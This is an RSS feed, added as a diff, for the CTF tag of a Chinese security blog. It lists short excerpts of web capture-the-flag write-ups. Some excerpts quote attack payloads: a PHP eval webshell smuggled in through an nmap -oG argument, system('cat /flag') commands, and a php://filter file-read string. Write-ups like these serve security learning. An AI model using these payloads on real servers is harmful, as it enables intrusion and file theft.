@@ -1,0 +1,700 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" 
+  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
+  xmlns:dc="http://purl.org/dc/elements/1.1/" 
+  xmlns:atom="http://www.w3.org/2005/Atom" 
+  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
+  xmlns:media="http://search.yahoo.com/mrss/">
+  <channel>
+    <title>ctf on 路人枭的博客</title>
+    <link>https://lurenxiao1998.github.io/zh/tags/ctf/</link>
+    <description>Recent content in ctf on 路人枭的博客</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh</language>
+    <managingEditor>lurenxiao98@gmail.com (Lurenxiao)</managingEditor>
+    <webMaster>lurenxiao98@gmail.com (Lurenxiao)</webMaster>
+    <copyright>&amp;copy;{year}, All Rights Reserved</copyright>
+    <lastBuildDate>Fri, 31 Jan 2020 16:48:00 +0900</lastBuildDate>
+    
+        <atom:link href="https://lurenxiao1998.github.io/zh/tags/ctf/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    
+
+      
+      <item>
+        <title>[WesternCTF2018]shrine</title>
+        <link>https://lurenxiao1998.github.io/zh/posts/westernctf2018shrine/</link>
+        <pubDate>Fri, 31 Jan 2020 16:48:00 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Fri, 31 Jan 2020 16:48:00 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/zh/posts/westernctf2018shrine/</guid>
+        <description>分析 打开网页首先是一段源码，右键查看网页源代码，如下： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 import flask import os app = flask.Flask(__name__) app.config[&amp;#39;FLAG&amp;#39;] = os.environ.pop(&amp;#39;FLAG&amp;#39;) @app.route(&amp;#39;/&amp;#39;) def index(): return open(__file__).read() @app.route(&amp;#39;/shrine/&amp;lt;path:shrine&amp;gt;&amp;#39;)</description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        
+        
+        
+        
+          
+            
+              <category>BUUCTF</category>
+            
+          
+            
+              <category>ctf</category>
+            
+          
+            
+              <category>web</category>
+            
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>shrine</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>BUUCTF</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>[极客大挑战2019]Http</title>
+        <link>https://lurenxiao1998.github.io/zh/posts/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019http/</link>
+        <pubDate>Wed, 29 Jan 2020 12:34:00 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Wed, 29 Jan 2020 12:34:00 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/zh/posts/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019http/</guid>
+        <description>知识点 http请求头 解题过程 访问题目，F12查看源码 发现有个Secret.php，访问 看到这个应该就知道是要修改请求头了，可以用Modify</description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        
+        
+        
+        
+          
+            
+              <category>BUUCTF</category>
+            
+          
+            
+              <category>ctf</category>
+            
+          
+            
+              <category>web</category>
+            
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>Http</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>BUUCTF</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>[ASIS 2019]Unicorn shop</title>
+        <link>https://lurenxiao1998.github.io/zh/posts/asis-2019unicorn-shop/</link>
+        <pubDate>Wed, 29 Jan 2020 11:39:20 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Wed, 29 Jan 2020 11:39:20 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/zh/posts/asis-2019unicorn-shop/</guid>
+        <description>知识点 Unicode安全问题 过程 这题buuctf环境没搭好？前三个正常字符也买不了，最后一个我试了其他的一万字符出错了。 0xF0 0x90 0xA7 0xA4 这题编码为u</description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        
+        
+        
+        
+          
+            
+              <category>BUUCTF</category>
+            
+          
+            
+              <category>ctf</category>
+            
+          
+            
+              <category>web</category>
+            
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>Unicorn shop</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>BUUCTF</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>[极客大挑战 2019]PHP</title>
+        <link>https://lurenxiao1998.github.io/zh/posts/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019php/</link>
+        <pubDate>Mon, 20 Jan 2020 20:46:00 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Mon, 20 Jan 2020 20:46:00 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/zh/posts/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019php/</guid>
+        <description>知识点 反序列化绕过__wakeup魔术方法（当成员属性数目大于实际数目时可绕过） 解题过程 题目说备份，应该是要下载网站源代码审计。我用的扫描工</description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        
+        
+        
+        
+          
+            
+              <category>BUUCTF</category>
+            
+          
+            
+              <category>ctf</category>
+            
+          
+            
+              <category>web</category>
+            
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>PHP</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>BUUCTF</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>[极客大挑战 2019]Knife</title>
+        <link>https://lurenxiao1998.github.io/zh/posts/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019knife/</link>
+        <pubDate>Mon, 20 Jan 2020 18:38:00 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Mon, 20 Jan 2020 18:38:00 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/zh/posts/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019knife/</guid>
+        <description>知识点 一句话木马 解题过程 弟弟题，直接给了shell payload 1 system(&amp;#34;ls -l /&amp;#34;); 1 system(&amp;#34;cat /flag&amp;#34;);</description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        
+        
+        
+        
+          
+            
+              <category>BUUCTF</category>
+            
+          
+            
+              <category>ctf</category>
+            
+          
+            
+              <category>web</category>
+            
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>Knife</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>BUUCTF</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>[BUUCTF 2018]Online Tool</title>
+        <link>https://lurenxiao1998.github.io/zh/posts/buuctf-2018online-tool/</link>
+        <pubDate>Mon, 20 Jan 2020 18:27:00 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Mon, 20 Jan 2020 18:27:00 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/zh/posts/buuctf-2018online-tool/</guid>
+        <description>知识点 https://paper.seebug.org/164/ payload 1 &amp;#39; &amp;lt;?php @eval(\$_POST[\&amp;#34;hack\&amp;#34;]);?&amp;gt; -oG hack.php &amp;#39;</description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        
+        
+        
+        
+          
+            
+              <category>BUUCTF</category>
+            
+          
+            
+              <category>ctf</category>
+            
+          
+            
+              <category>web</category>
+            
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>Online Tool</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>BUUCTF</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>[ZJCTF 2019]NiZhuanSiWei</title>
+        <link>https://lurenxiao1998.github.io/zh/posts/zjctf-2019nizhuansiwei/</link>
+        <pubDate>Mon, 20 Jan 2020 10:46:00 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Mon, 20 Jan 2020 10:46:00 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/zh/posts/zjctf-2019nizhuansiwei/</guid>
+        <description>知识点 php反序列化 php伪协议 include利用php伪协议 解题过程 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 &amp;lt;?php $text = $_GET[&amp;#34;text&amp;#34;]; $file = $_GET[&amp;#34;file&amp;#34;]; $password = $_GET[&amp;#34;password&amp;#34;]; if(isset($text)&amp;amp;&amp;amp;(file_get_contents($text,&amp;#39;r&amp;#39;)===&amp;#34;welcome to the zjctf&amp;#34;)){ echo &amp;#34;&amp;lt;br&amp;gt;&amp;lt;h1&amp;gt;&amp;#34;.file_get_contents($text,&amp;#39;r&amp;#39;).&amp;#34;&amp;lt;/h1&amp;gt;&amp;lt;/br&amp;gt;&amp;#34;;</description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        
+        
+        
+        
+          
+            
+              <category>BUUCTF</category>
+            
+          
+            
+              <category>ctf</category>
+            
+          
+            
+              <category>web</category>
+            
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>NiZhuanSiWei</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>BUUCTF</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>[极客大挑战 2019]Secret File</title>
+        <link>https://lurenxiao1998.github.io/zh/posts/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019secret-file/</link>
+        <pubDate>Sat, 18 Jan 2020 14:23:00 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Sat, 18 Jan 2020 14:23:00 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/zh/posts/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019secret-file/</guid>
+        <description>[极客大挑战 2019]Secret File 知识点 配合php伪协议利用文件包含漏洞 PHP伪协议总结 使用php的file伪协议去读取文件 payload ?file=php://filter/convert.base64-encode/resource=flag.php</description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        
+        
+        
+        
+          
+            
+              <category>BUUCTF</category>
+            
+          
+            
+              <category>ctf</category>
+            
+          
+            
+              <category>web</category>
+            
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>Secret File</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>BUUCTF</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>[RoarCTF 2019]Easy Java</title>
+        <link>https://lurenxiao1998.github.io/zh/posts/roarctf-2019easy-java/</link>
+        <pubDate>Sat, 14 Dec 2019 21:29:00 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Sat, 14 Dec 2019 21:29:00 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/zh/posts/roarctf-2019easy-java/</guid>
+        <description>反序列化漏洞 考点 PHP反序列化漏洞 弱口令 解题过程 开头看到这个，爆破。 用户名admin，密码admin888 获得一个照片地址，但没啥用，点he</description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        
+        
+        
+        
+          
+            
+              <category>BUUCTF</category>
+            
+          
+            
+              <category>ctf</category>
+            
+          
+            
+              <category>web</category>
+            
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>Easy Java</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>BUUCTF</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>piapiapia</title>
+        <link>https://lurenxiao1998.github.io/zh/posts/0ctf-2016piapiapia/</link>
+        <pubDate>Thu, 12 Dec 2019 19:29:20 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Thu, 12 Dec 2019 19:29:20 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/zh/posts/0ctf-2016piapiapia/</guid>
+        <description>前言 这道题主要考两个知识点： 数组绕过正则 preg_match(pattern,Array()) = false md5(Array()) = null sha1(Array()) = null ereg(pattern,Array()) =null strcmp(Array(), “abc”) =null strpos(Array(),“abc”) = null strlen(Array()) = null 改变序列化</description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        
+        
+        
+        
+          
+            
+              <category>BUUCTF</category>
+            
+          
+            
+              <category>ctf</category>
+            
+          
+            
+              <category>web</category>
+            
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>0CTF</category>
+            
+          
+            
+              <category>piapiapia</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>BUUCTF</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>piapiapia</title>
+        <link>https://lurenxiao1998.github.io/zh/posts/redis-ssrf/</link>
+        <pubDate>Thu, 12 Dec 2019 19:29:20 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Thu, 12 Dec 2019 19:29:20 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/zh/posts/redis-ssrf/</guid>
+        <description>SSRF简介 SSRF(Server-Side Request Forgery：服务器端请求伪造)是攻击者利用服务端为外部提供服务的机器的漏洞，访问服务器端的内网服务。 前置知识 RESP协议</description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        
+        
+        
+        
+          
+            
+              <category>ctf</category>
+            
+          
+            
+              <category>web</category>
+            
+          
+            
+              <category>webctf</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>BUUCTF SSRFMe</title>
+        <link>https://lurenxiao1998.github.io/zh/posts/ssrf-me/</link>
+        <pubDate>Sun, 08 Dec 2019 18:20:20 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Sun, 08 Dec 2019 18:20:20 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/zh/posts/ssrf-me/</guid>
+        <description>解法一 哈希拓展攻击 secert_key 是一个长度为 16 的字符串，在 /geneSign?param=flag.txt 中可以获取hashlib.md5(secert_key + param + action).hexdigest() ，密钥param不动，增加ac</description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        
+        
+        
+        
+          
+            
+              <category>BUUCTF</category>
+            
+          
+            
+              <category>ctf</category>
+            
+          
+            
+              <category>web</category>
+            
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>De1CTF</category>
+            
+          
+            
+              <category>SSRFMe</category>
+            
+          
+            
+              <category>SSRFMe</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+        
+        
+          
+            
+              <category>webctf</category>
+            
+          
+            
+              <category>BUUCTF</category>
+            
+          
+        
+      </item>
+      
+
+    
+  </channel>
+</rss>
